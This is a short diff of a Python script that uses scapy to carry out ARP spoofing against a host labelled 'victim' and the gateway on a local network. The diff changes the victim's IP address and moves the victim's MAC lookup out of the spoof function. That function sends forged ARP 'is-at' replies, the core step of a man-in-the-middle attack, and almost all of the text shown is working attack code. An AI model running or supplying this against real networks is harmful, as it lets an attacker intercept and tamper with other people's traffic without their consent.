@@ -4,7 +4,7 @@ import scapy.layers.l2 as l2
 import scapy.all as scapy
 import time
 
-victim_ip = "192.168.1.2"
+victim_ip = "192.168.1.3"
 gateway_ip = "192.168.1.1"
 
 
@@ -16,8 +16,9 @@ def get_mac(ip):
     return answered_list[0][1].hwsrc
 
 
+target_mac = get_mac(victim_ip)
+
 def spoof(target_ip: str, spoof_ip: str):
-    target_mac = get_mac(target_ip)
     packet = l2.ARP(pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, op='is-at')
     scapy.send(packet, verbose=False)
 
